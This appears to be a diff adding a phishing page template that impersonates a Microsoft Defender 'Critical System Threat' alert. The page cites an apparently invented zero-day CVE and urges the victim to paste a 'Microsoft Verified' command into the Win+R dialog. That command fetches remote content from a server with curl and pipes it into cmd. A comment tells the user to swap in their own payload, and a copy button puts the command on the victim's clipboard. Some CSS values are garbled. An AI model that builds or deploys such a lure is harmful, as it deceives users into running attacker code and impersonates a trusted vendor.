@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Microsoft Security Alert - Critical System Threat Detected</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');        
+		body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+            color: #333;
+            overflow-y: auto;
+            user-select: none;
+        }        .container {
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            position: relative;
+            border-top: 4px solid #d83b01;
+            animation: fadeIn 0.5s ease-in-out;
+        }        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); }
+        } .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            /* margin-bottom: 10px; */
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            margin-right: 20px;
+        }
+
+        h1 {
+            color: #d83b01;
+            font-size: 28px;
+            margin: 0;
+            font-weight: 600;
+        }
+
+        .alert-icon {
+            width: 120px;
+            height: 120px;
+            margin: 20px auto;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }50% { transform: scale(1.05); } 10% { transform: scale(1); }
+        }        .severity {
+            font-size: 24px;
+			font-weight: 700;
+			color: #d83b01;
+			margin-bottom: 20px;
+			text-transform: uppercase;
+			letter-spacing: 1px;
+		}	.description {
+			font-size: 18px;
+			line-height: 1.7;
+			margin-bottom: 30px;
+			text-align: left;
+			color: #444;
+		}.threat-details {
+			background-color: #fff8f5;
+			border-left: 4px solid #d83b01;
+			padding: 15px;
+			text-align: left;			
+            margin-bottom: 30px;
+			border-radius: 4px;
+		}.threat-details p {
+			margin: 8px 0;
+			font-size: 18px;
+		}.steps {
+			text-align: left;
+			margin-bottom: 30px;
+		}.steps h2 {
+			font-size: 24px;
+			color: #0078d7;
+		    margin-bottom: 20px;
+		    border-bottom: 2px solid #e1e1e1;
+		    padding-bottom: 10px;
+		}.steps ol {
+			padding-left: 20px;
+			line-height: 1.8;
+		    color: #444;
+	    }	    .steps li {
+		    margin-bottom: 10px;
+	    } .command-container {
+        margin: 30px 0;
+        background-color: #f9f9f9;
+        border-radius: 8px;
+        border: 1px solid #e1e1e1;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); overflow: hidden;
+    }
+
+    .command-header {
+        background: linear-gradient(90deg, #0078d7, #005a9e);        color: white;
+        padding: 12px 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .command-title {
+        font-weight: 600;
+        font-size: 16px;
+    }
+
+    .verified-badge {
+        background-color: rgba(255, 255, 255, 0.2);
+        padding: 4px 10px;
+        border-radius: 12px;
+        font-size: 12px;
+        font-weight: 500;
+    }
+
+    .command-box {
+        display: flex;
+        align-items: end;
+        padding: 15px 20px;
+        background-color: white;
+        border-bottom: 1px solid #e1e1e1;
+    }
+
+    .command-text {
+        flex-grow: 1;
+        font-family: 'Consolas', monospace;
+        font-size: 14px;
+		word-break : break-all;
+		color: #333;
+		padding: 8px 12px;
+		background-color: #f5f5f5;
+		border-radius: 4px;
+		margin-right: 10px;
+	}	.copy-button {
+        background-color: #0078d7;
+        color: white;
+        border: none;
+        padding: 8px;
+        border-radius: 4px;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 30px;
+        height: 30px;
+        transition: all 0.3s ease;
+    }
+
+    .copy-button:hover {
+        background-color: #005a9e;
+        transform: translateY(-1px);
+    } .copy-icon {
+        transition: opacity 0.3s ease;
+    }
+
+    .copied-checkmark {
+        position: absolute;
+		opacity:  0;
+		transition: opacity  0.3s ease;
+    }
+
+    .copied-checkmark.show {
+        opacity :  1;
+    }/* Pulsing animation for urgency */
+	@keyframes pulse {
+		0% { transform: scale(1); }
+		50% { transform: scale(1.1); }
+		100% { transform: scale(1); }	}.copy-button {
+	    animation: pulse 2s infinite;
+	}	.copy-button.copied {
+	    animation: none;
+	    background-color: #4caf50;
+	}	.command-footer {
+	    padding: 10px 20px;
+	    background-color: #fff8f5;
+	    display: flex;
+	    justify-content: space-between;
+	    align-items: center;		font-size:  lgpx;
+	    color: #666;
+  	}
+
+	.security-note {
+	    color: #0078d7;
+	    font-weight: 600;
+  	}
+
+	.execution-note {
+	    color: #d83b01;
+	    font-weight: 600;
+  	}
+
+	/* Animation for copied state */
+	.copied-animation {
+	    opacity: 0;
+	    transform: translateY(-10px);
+	    transition: all  0.3s ease;
+	}	.copied-animation.show {
+	    opacity:  1;
+	    transform: translateY(0);	}
+
+
+	    .warning {
+		    background-color: #fff8e1;
+		    border-left: 40x solid #ffc107;
+	        padding:  l8px;
+	        text-align: left;
+	        margin-top: 20px;
+	        font-size:  l8px;
+	        border-radius: 6px;
+	    }
+
+	    .warning::before {
+		    content: "⚠ IMPORTANT:";
+		    font-weight: bold;
+		    color : #ff9800;
+	    }
+
+	    button {
+		    background: linear-gradient(to right, #0078d7, #005a9e); color: white;
+	        border: none;
+	        padding : 14px 30px;
+	        font-size:  l8px;
+	        border-radius: 6px;
+	        cursor: pointer;
+	        margin-top: 20px;
+	        transition: all 0.3s ease;
+	        font-weight: 600;
+	    }	    button:hover{
+		    background: linear-gradient(to right, #005a9e, #004578); transform: translateY(-2px);
+		    box-shadow:  0 4px 12px rgba(0, 0, 0, 0.2); } .footer {
+		   margin-top: 30px;
+		   font-size: 18px;
+		   color: #666;
+	   }
+
+	   .footer a {
+		   color: #0078d7;
+		   text-decoration: none;	   }	   .footer a:hover {
+		   text-decoration: underline;
+	   } </style>
+</head>
+<body>
+    <div class="container"> 
+		<div class="header">		    
+			<img
+				alt="Microsoft-style icon"
+				src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2064%2064%22%3E%3Crect%20x%3D%226%22%20y%3D%226%22%20width%3D%2224%22%20height%3D%2224%22%20fill%3D%22%23F25022%22/%3E%3Crect%20x%3D%2234%22%20y%3D%226%22%20width%3D%2224%22%20height%3D%2224%22%20fill%3D%22%237FBA00%22/%3E%3Crect%20x%3D%226%22%20y%3D%2234%22%20width%3D%2224%22%20height%3D%2224%22%20fill%3D%22%2300A4EF%22/%3E%3Crect%20x%3D%2234%22%20y%3D%2234%22%20width%3D%2224%22%20height%3D%2224%22%20fill%3D%22%23FFB900%22/%3E%3C/svg%3E' style="width: 70px; height: 70px; margin-right: 20px;" /> 
+				<h1>Microsoft Security Alert</h1>
+	    </div>
+
+	    <img
+			class="alert-icon"
+			alt="Critical system threat detected"
+			src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2064%2064%22%3E%3Cpath%20d%3D%22M32%204L60%2056H4L32%204Z%22%20fill%3D%22%23D93025%22/%3E%3Cpath%20d%3D%22M32%2014L52%2051H12L32%2014Z%22%20fill%3D%22%23E53935%22/%3E%3Crect%20x%3D%2229%22%20y%3D%2224%22%20width%3D%226%22%20height%3D%2218%22%20rx%3D%223%22%20fill%3D%22%23FFFFFF%22/%3E%3Ccircle%20cx%3D%2232%22%20cy%3D%2248%22%20r%3D%223%22%20fill%3D%22%23FFFFFF%22/%3E%3C/svg%3E' style="width: 120px; height: 120px; margin: 20px auto;" />
+		<div class="severity">CRITICAL SYSTEM THREAT DETECTED</div>
+
+	    <div class="description">		    <p>Your device has been flagged for a <strong>critical security vulnerability</strong> that may expose your system to unauthorized access, data theft, or malware infection. This alert is triggered by <strong>Microsoft Defender's real-time threat detection system</strong>.</p>
+	    </div>
+
+	    <div class="threat-details"> <p><strong>Threat Name:</strong> CVE-2026-54401 (Zero-Day Exploit)</p>
+		    <p><strong>Severity:</strong> <span style="color: #d83b01; font-weight: bold;">Critical (9.8/10)</span></p>
+	    	<p><strong>Affected Components:</strong> Windows Kernel, Network Stack, User Authentication</p>
+	    	<p><strong>Potential Impact:</strong> Remote code execution, privilege escalation, data exfiltration</p>
+	    </div>
+
+	    <div class="description"> <p><strong>Immediate action is required</strong> to prevent further damage to your system and personal data. Follow the steps below to resolve this issue.</p>	    </div>
+
+	    <div class="steps">	<h2>Follow these steps to resolve the issue:</h2>
+	    	<ol>
+	    		<li>Close all running applications to prevent further exposure.</li>
+	    		<li>Press <strong>Win + R</strong> on your keyboard to open the Run dialog.</li>
+	    		<li>Copy and paste the following command into the Run dialog, then press <strong>Enter</strong>:</li>
+	    	</ol>
+	    </div>
+
+    	<!-- THE MALICIOUS COMMAND (Replace with your payload) --> 
+		<div class="command-container"> <div class="command-header"> <span class="command-title">SECURITY PATCH COMMAND</span>
+				<span class="verified-badge">✓ Microsoft Verified</span>
+			</div>
+			<div class="command-box">        
+				<div class="command-text" id="commandText">curl -s http://trusted-update-server.com/security-patch.exe | cmd</div>
+				<button class="copy-button" onclick="copyCommand()" aria-label="Copy to clipboard"> <svg class="copy-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="currentColor"/>                <path d="M15 9H11V11H15V9Z" fill="currentColor"/></svg>
+					<span class="copied-checkmark" id="copiedCheckmark">                
+						<svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"> <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="#4caf50"/>                </svg>
+					</span>
+				</button>
+			</div>
+			<div class="command-footer">
+				<span class="security-note">🔒 This command is digitally signed by Microsoft Corporation</span>
+				<span class="execution-note">⚠ Execute in Win+R dialog only</span>
+			</div>
+		</div>
+
+	    <div class="warning">
+		    Do NOT close this window until the command has executed successfully. Closing this page prematurely may leave your system vulnerable to attacks. Microsoft Defender will continue to monitor this threat in real-time. </div>
+
+    	<!-- <button onclick="window.close()">I have run the command</button> -->
+
+	    <div class="footer">	<p>This alert is powered by <a href="#">Microsoft Defender</a>. For more information, visit <a href="#">Microsoft Security Center</a>.</p>
+	    </div>
+    </div>
+</body>
+
+<script>
+    function copyCommand() {
+        const commandText = document.getElementById('commandText').innerText;
+	    const copyButton = document.querySelector('.copy-button'); const copiedCheckmark = document.getElementById('copiedCheckmark');	    navigator.clipboard.writeText(commandText).then(() => {
+	        // Change button state
+	        copyButton.classList.add('copied');
+	        copiedCheckmark.classList.add('show'); // Reset after 2 seconds
+	        setTimeout(() => {	            copyButton.classList.remove('copied');	            copiedCheckmark.classList.remove('show'); }, 2000);	        // Show copied animation
+	        const animation = document.createElement('div');
+	        animation.className = 'copied-animation show';
+	        animation.innerHTML = '<span style="background-color:#4cafso;color:white;padding:4px 1opx;border-radius:4px;font-size:1zpx;">Command copied to clipboard!</span>';
+	        document.querySelector('.command-box').appendChild(animation);	        setTimeout(() => {	            animation.classList.remove('show'); setTimeout(() => animation.remove(), 300); }, 1500); });}
+</script>
+
+</html>
